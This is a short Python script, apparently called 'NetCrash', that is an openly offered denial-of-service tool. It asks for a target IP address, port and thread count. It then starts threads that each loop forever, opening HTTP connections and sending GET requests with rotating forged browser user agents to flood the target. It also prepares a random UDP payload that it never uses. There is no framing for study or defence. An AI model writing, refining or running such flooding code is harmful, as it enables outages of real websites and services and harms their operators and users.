import socket
import random
import threading
import http.client

print('''
      __     _     ___              _     
  /\ \ \___| |_  / __\ __ __ _ ___| |__  
 /  \/ / _ \ __|/ / | '__/ _` / __| '_ \ 
/ /\  /  __/ |_/ /__| | | (_| \__ \ | | |
\_\ \/ \___|\__\____/_|  \__,_|___/_| |_|  by Sahmeran
                                            
''')

target_ip = input("Enter the IP address of the target site: ")
port = int(input("Enter the port number to attack: "))
packet_num = int(input("Enter the number of packets to send: "))

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
payload = random._urandom(4096)


user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
]

def send_packet():
    while True:
    
        user_agent = random.choice(user_agents)
        headers = {"User-Agent": user_agent}
        conn = http.client.HTTPConnection(target_ip, port)
        conn.request("GET", "/", headers=headers)

for i in range(packet_num):
    t = threading.Thread(target=send_packet)
    t.start()

print(f"NetCrash: Sending {packet_num} packets to {target_ip} on port {port}")
